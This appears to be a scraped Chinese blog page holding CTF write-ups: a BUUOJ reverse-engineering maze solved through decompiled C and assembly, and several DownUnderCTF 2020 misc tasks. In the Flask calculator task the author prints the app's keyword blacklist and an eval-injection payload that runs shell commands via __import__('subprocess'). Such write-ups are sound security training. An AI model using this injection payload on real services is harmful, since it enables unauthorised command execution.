    </span>

  
  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/09/28/BUUOJ%E5%88%B7%E9%A2%98-Reverse-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/28/BUUOJ%E5%88%B7%E9%A2%98-Reverse-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>2.4k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>2 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>BUUOJ Reverse的不一样的flag。 开局F5， <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+17h] [ebp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+30h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+38h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(&amp;v3, _data_start__, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;v4 + i) &lt; <span class="number">0</span> || *(&amp;v4 + i) &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)&amp;v8 + <span class="number">5</span> * v4 + v5 - <span class="number">41</span>) == <span class="number">49</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)&amp;v8 + <span class="number">5</span> * v4 + v5 - <span class="number">41</span>) == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这题拿出来是因为这题反映，做逆向是一定要看汇编的。我们直接看代码，发现会有点奇怪。到<code>for ( i = 0; i &lt;= 1; ++i )</code>之前没问题，判断输入是否合法。从for开始有问题了，i=1时*(&amp;v4+i)是什么写法，&amp;v4是输入，根据定义应该是个int，不是数组，不应该+i的。但是，看上面对v4 v5的注释，一个在[esp+30h]，一个在[esp+34h]，位置相差一个int字节（4），所以其实*(&amp;v4+1)说的是v5。然后下面那个if更不知所云。v8声明后就没用过，这个时候突然冒出来。v5的位置是[esp+40h]，那么*(&amp;v8)-41（这个41是十进制）实际上等于[esp+17h]。然后回头看汇编： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00401334                 push    ebp</span><br><span class="line">.text:00401335                 mov     ebp, esp</span><br><span class="line">.text:00401337                 push    edi</span><br><span class="line">.text:00401338                 push    esi</span><br><span class="line">.text:00401339                 push    ebx</span><br><span class="line">.text:0040133A                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0040133D                 sub     esp, 40h</span><br><span class="line">.text:00401340                 call    ___main</span><br><span class="line">.text:00401345                 mov     dword ptr [esp+30h], 0</span><br><span class="line">.text:0040134D                 mov     dword ptr [esp+34h], 0</span><br><span class="line">.text:00401355                 lea     edx, [esp+17h]</span><br><span class="line">.text:00401359                 mov     ebx, offset __data_start__ ; &quot;*11110100001010000101111#&quot;</span><br><span class="line">.text:0040135E                 mov     eax, 19h</span><br><span class="line">.text:00401363                 mov     edi, edx</span><br><span class="line">.text:00401365                 mov     esi, ebx</span><br><span class="line">.text:00401367                 mov     ecx, eax</span><br><span class="line">.text:00401369                 rep movsb</span><br><span class="line">.text:0040136B                 jmp     short loc_40136E</span><br></pre></td></tr></table></figure> esp+17h被lea赋值给edx后又赋值edi，然后ebx等于__data_start__的地址，把ecx赋值为0x19（十进制25），执行rep movsb，把esi指向地址的字符搬到edi指向，执行25次。 所以[esp+17h]就是__data_start__。那么回到F5的代码，<code>*((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41)</code>可写成<code>*(&amp;__data_start__ + 5 * v4 + v5)</code>，5*v4+v5，有点像二维数组的读取方式。 那么把那串神比的__data_start__展成二维数组的形式： <em>1111 01000 01010 00010 1111# 实际上这是个迷宫。我们入口点在</em>，要求根据输入执行上下左右移动，不能碰到1（49），最终走到#（35）。这个直接看就行，下下下右右上上右右下下下下。 执行程序，依次输入222441122444，提示ok, the order you enter is the flag!，那就是flag{222441122444}。</p>

    <div id="aplayer-lnJdnhto" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="3423995" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
    ></div>
<p>flag{f0938a65-f4d9-48d5-9289-dacc329978f7}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/25/DownunderCTF-2020-Misc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpeg">
      <meta itemprop="name" content="Tiaonmmn.ZMZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tiaonmmn's Littile House">
    </span>

    
    
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/25/DownunderCTF-2020-Misc/" class="post-title-link" itemprop="url">DownunderCTF-2020-Misc</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2020-09-25 15:02:07 / 修改时间：18:15:49" itemprop="dateCreated datePublished" datetime="2020-09-25T15:02:07+08:00">2020-09-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
        </span>
    </span>

  
  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/09/25/DownunderCTF-2020-Misc/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/25/DownunderCTF-2020-Misc/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>9.5k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>9 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Downunder CTF 2020的Misc。就不拆成太多文章了。</p>
<h1 id="home-runs">16-home-runs</h1>
<div class="note info"><p>How does this string relate to baseball in anyway? What even is baseball? And how does this relate to Cyber Security? ¯(ツ)/¯ <code>RFVDVEZ7MTZfaDBtM19ydW41X20zNG41X3J1bm4xbjZfcDQ1N182NF9iNDUzNX0=</code></p>
</div>
<p>没啥说的，Base64解码就完事了嗷。DUCTF{16_h0m3_run5_m34n5_runn1n6_p457_64_b4535}</p>
<h1 id="addition">Addition</h1>
<div class="note info"><p>Joe is aiming to become the next supreme coder by trying to make his code smaller and smaller. His most recent project is a simple calculator which he reckons is super secure because of the "filters" he has in place. However, he thinks that he knows more than everyone around him. Put Joe in his place and grab the flag.</p>
</div>
<p>给了个网址。计算器，这东西不应该是Web(σﾟдﾟ)σ？可以用1+ord('a')，看来是直接Eval的。输入globals()看一下全局变量，</p>
<blockquote><p>{'<strong>name</strong>': 'main', '<strong>doc</strong>': None, '<strong>package</strong>': '', '<strong>loader</strong>': &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fa0f27d7520&gt;, '<strong>spec</strong>': ModuleSpec(name='main', loader=&lt;_frozen_importlib_external.SourceFileLoader object at 0x7fa0f27d7520&gt;, origin='./main.py'), '<strong>file</strong>': './main.py', '<strong>cached</strong>': './<strong>pycache</strong>/main.cpython-38.pyc', '<strong>builtins</strong>': {'<strong>name</strong>': 'builtins', '<strong>doc</strong>': "Built-in functions, exceptions, and other objects.: None is the <code>nil' object; Ellipsis represents</code>...' in slices.", '<strong>package</strong>': '', '<strong>loader</strong>': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '<strong>spec</strong>': ModuleSpec(name='builtins', loader=&lt;class '_frozen_importlib.BuiltinImporter'&gt;), '<strong>build_class</strong>': &lt;built-in function <strong>build_class</strong>&gt;, '<strong>import</strong>': &lt;built-in function <strong>import</strong>&gt;, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': &lt;class 'bool'&gt;, 'memoryview': &lt;class 'memoryview'&gt;, 'bytearray': &lt;class 'bytearray'&gt;, 'bytes': &lt;class 'bytes'&gt;, 'classmethod': &lt;class 'classmethod'&gt;, 'complex': &lt;class 'complex'&gt;, 'dict': &lt;class 'dict'&gt;, 'enumerate': &lt;class 'enumerate'&gt;, 'filter': &lt;class 'filter'&gt;, 'float': &lt;class 'float'&gt;, 'frozenset': &lt;class 'frozenset'&gt;, 'property': &lt;class 'property'&gt;, 'int': &lt;class 'int'&gt;, 'list': &lt;class 'list'&gt;, 'map': &lt;class 'map'&gt;, 'object': &lt;class 'object'&gt;, 'range': &lt;class 'range'&gt;, 'reversed': &lt;class 'reversed'&gt;, 'set': &lt;class 'set'&gt;, 'slice': &lt;class 'slice'&gt;, 'staticmethod': &lt;class 'staticmethod'&gt;, 'str': &lt;class 'str'&gt;, 'super': &lt;class 'super'&gt;, 'tuple': &lt;class 'tuple'&gt;, 'type': &lt;class 'type'&gt;, 'zip': &lt;class 'zip'&gt;, '<strong>debug</strong>': True, 'BaseException': &lt;class 'BaseException'&gt;, 'Exception': &lt;class 'Exception'&gt;, 'TypeError': &lt;class 'TypeError'&gt;, 'StopAsyncIteration': &lt;class 'StopAsyncIteration'&gt;, 'StopIteration': &lt;class 'StopIteration'&gt;, 'GeneratorExit': &lt;class 'GeneratorExit'&gt;, 'SystemExit': &lt;class 'SystemExit'&gt;, 'KeyboardInterrupt': &lt;class 'KeyboardInterrupt'&gt;, 'ImportError': &lt;class 'ImportError'&gt;, 'ModuleNotFoundError': &lt;class 'ModuleNotFoundError'&gt;, 'OSError': &lt;class 'OSError'&gt;, 'EnvironmentError': &lt;class 'OSError'&gt;, 'IOError': &lt;class 'OSError'&gt;, 'EOFError': &lt;class 'EOFError'&gt;, 'RuntimeError': &lt;class 'RuntimeError'&gt;, 'RecursionError': &lt;class 'RecursionError'&gt;, 'NotImplementedError': &lt;class 'NotImplementedError'&gt;, 'NameError': &lt;class 'NameError'&gt;, 'UnboundLocalError': &lt;class 'UnboundLocalError'&gt;, 'AttributeError': &lt;class 'AttributeError'&gt;, 'SyntaxError': &lt;class 'SyntaxError'&gt;, 'IndentationError': &lt;class 'IndentationError'&gt;, 'TabError': &lt;class 'TabError'&gt;, 'LookupError': &lt;class 'LookupError'&gt;, 'IndexError': &lt;class 'IndexError'&gt;, 'KeyError': &lt;class 'KeyError'&gt;, 'ValueError': &lt;class 'ValueError'&gt;, 'UnicodeError': &lt;class 'UnicodeError'&gt;, 'UnicodeEncodeError': &lt;class 'UnicodeEncodeError'&gt;, 'UnicodeDecodeError': &lt;class 'UnicodeDecodeError'&gt;, 'UnicodeTranslateError': &lt;class 'UnicodeTranslateError'&gt;, 'AssertionError': &lt;class 'AssertionError'&gt;, 'ArithmeticError': &lt;class 'ArithmeticError'&gt;, 'FloatingPointError': &lt;class 'FloatingPointError'&gt;, 'OverflowError': &lt;class 'OverflowError'&gt;, 'ZeroDivisionError': &lt;class 'ZeroDivisionError'&gt;, 'SystemError': &lt;class 'SystemError'&gt;, 'ReferenceError': &lt;class 'ReferenceError'&gt;, 'MemoryError': &lt;class 'MemoryError'&gt;, 'BufferError': &lt;class 'BufferError'&gt;, 'Warning': &lt;class 'Warning'&gt;, 'UserWarning': &lt;class 'UserWarning'&gt;, 'DeprecationWarning': &lt;class 'DeprecationWarning'&gt;, 'PendingDeprecationWarning': &lt;class 'PendingDeprecationWarning'&gt;, 'SyntaxWarning': &lt;class 'SyntaxWarning'&gt;, 'RuntimeWarning': &lt;class 'RuntimeWarning'&gt;, 'FutureWarning': &lt;class 'FutureWarning'&gt;, 'ImportWarning': &lt;class 'ImportWarning'&gt;, 'UnicodeWarning': &lt;class 'UnicodeWarning'&gt;, 'BytesWarning': &lt;class 'BytesWarning'&gt;, 'ResourceWarning': &lt;class 'ResourceWarning'&gt;, 'ConnectionError': &lt;class 'ConnectionError'&gt;, 'BlockingIOError': &lt;class 'BlockingIOError'&gt;, 'BrokenPipeError': &lt;class 'BrokenPipeError'&gt;, 'ChildProcessError': &lt;class 'ChildProcessError'&gt;, 'ConnectionAbortedError': &lt;class 'ConnectionAbortedError'&gt;, 'ConnectionRefusedError': &lt;class 'ConnectionRefusedError'&gt;, 'ConnectionResetError': &lt;class 'ConnectionResetError'&gt;, 'FileExistsError': &lt;class 'FileExistsError'&gt;, 'FileNotFoundError': &lt;class 'FileNotFoundError'&gt;, 'IsADirectoryError': &lt;class 'IsADirectoryError'&gt;, 'NotADirectoryError': &lt;class 'NotADirectoryError'&gt;, 'InterruptedError': &lt;class 'InterruptedError'&gt;, 'PermissionError': &lt;class 'PermissionError'&gt;, 'ProcessLookupError': &lt;class 'ProcessLookupError'&gt;, 'TimeoutError': &lt;class 'TimeoutError'&gt;, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2020 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'FlaskForm': &lt;class 'flask_wtf.form.FlaskForm'&gt;, 'Flask': &lt;class 'flask.app.Flask'&gt;, 'render_template': &lt;function render_template at 0x7fa0f16b80d0&gt;, 'request': &lt;Request 'http://127.0.0.1:1337/' [POST]&gt;, 'Form': &lt;class 'wtforms.form.Form'&gt;, 'validators': &lt;module 'wtforms.validators' from '/usr/local/lib/python3.8/site-packages/wtforms/validators.py'&gt;, 'StringField': &lt;class 'wtforms.fields.core.StringField'&gt;, 'SubmitField': &lt;class 'wtforms.fields.simple.SubmitField'&gt;, 'app': &lt;Flask 'main'&gt;, 'blacklist': ['import', 'os', 'sys', ';', 'print', '<strong>import</strong>', 'SECRET', 'KEY', 'app', 'open', 'globals', 'proc', 'self', 'read', 'exec'], 'maybe_not_maybe_this': 'HYPA HYPA', 'maybe_this_maybe_not': 'DUCTF{3v4L_1s_D4ng3r0u5}', 'CalculatorInput': &lt;class 'main.CalculatorInput'&gt;, 'mainpage': &lt;function mainpage at 0x7fa0f2800040&gt;}</p>
</blockquote>
<p>Flag直接给出来了，写在了配置文件。没写的话可以用open打开文件，以及，__import__没Ban呢，直接<code>__import__('subprocess').getoutput('ls')</code>执行命令。</p>
<h1 id="homepage">homepage</h1>
<div class="note info"><p>Hmm wasnt the homepage logo rainbow before? I wonder how it works...</p>
</div>
<p>Downunderctf.com主页上的logo有些东西，看源码得到splash.js， <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> END = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&#x27;2020-09-20T19:00:00.000+10:00&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> dispMain = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;countdown&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> disp = &#123;</span><br><span class="line">    ending: dispMain.querySelector(<span class="string">&#x27;#ending&#x27;</span>),</span><br><span class="line">    hour: dispMain.querySelector(<span class="string">&#x27;#countdown&gt;.hour&#x27;</span>),</span><br><span class="line">    minute: dispMain.querySelector(<span class="string">&#x27;#countdown&gt;.minute&#x27;</span>),</span><br><span class="line">    second: dispMain.querySelector(<span class="string">&#x27;#countdown&gt;.second&#x27;</span>),</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> timeout = <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">countdown</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> diff = <span class="built_in">Math</span>.floor((END - <span class="keyword">new</span> <span class="built_in">Date</span>()) / <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (diff &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      ending.parentNode.removeChild(ending);</span><br><span class="line">      dispMain.innerHTML = <span class="string">&#x27;&lt;h3&gt;Join us again in 2021&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    disp.hour.textContent = (<span class="built_in">Math</span>.floor(diff / <span class="number">3600</span>)).toString().padStart(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    disp.minute.textContent = (<span class="built_in">Math</span>.floor(diff / <span class="number">60</span>) % <span class="number">60</span>).toString().padStart(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    disp.second.textContent = (diff % <span class="number">60</span>).toString().padStart(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(countdown, <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  countdown();</span><br><span class="line">&#125;) ();</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">randomColor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> letters = <span class="string">&#x27;0123456789ABCDEF&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> color = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">      color += letters[<span class="built_in">Math</span>.floor(<span class="number">6</span> + <span class="built_in">Math</span>.random() * <span class="number">10</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> color;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params">elem</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      elem.style.fill = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> lol = <span class="string">&#x27;00101000000010000010111101100001101001011101000101101110100001100011111101101010&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;1010001111000111101000110010000001000000010010001000011111011101001111101001110111101010&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;0110011110010111100011011110001010000010001100110110000101011001110101010001011101001001&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;0110000011011110001010110011001011111001110010011101100011110000110111111001000011010101&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;0100000000101000111110101000111001111100111000010001000100110&#x27;</span>;</span><br><span class="line">  <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;#logo circle&#x27;</span>).forEach(<span class="function"><span class="keyword">function</span> (<span class="params">c, k</span>) </span>&#123;</span><br><span class="line">    c.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">      e.target.style.fill = lol[k] === <span class="string">&#x27;0&#x27;</span> ? <span class="string">&#x27;#005248&#x27;</span> : <span class="string">&#x27;#C3FCF1&#x27;</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;) ();</span><br><span class="line"></span><br></pre></td></tr></table></figure> const lol很扎眼，我们直接2进制转字符串是乱码，要处理一下。主页上有个405个点组成的SVG图形，上面代码简单来说就是要每当鼠标划过一个点时，根据lol的对应位与这个点在405个点的索引值赋色。</p>

    <div id="aplayer-iMTAOUJD" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="486814412" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
    ></div>
<p>flag{afd7081d-c9cc-42ed-865d-ef93d7e2a800}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/25/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-web/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpeg">
      <meta itemprop="name" content="Tiaonmmn.ZMZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tiaonmmn's Littile House">
    </span>

    
    
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
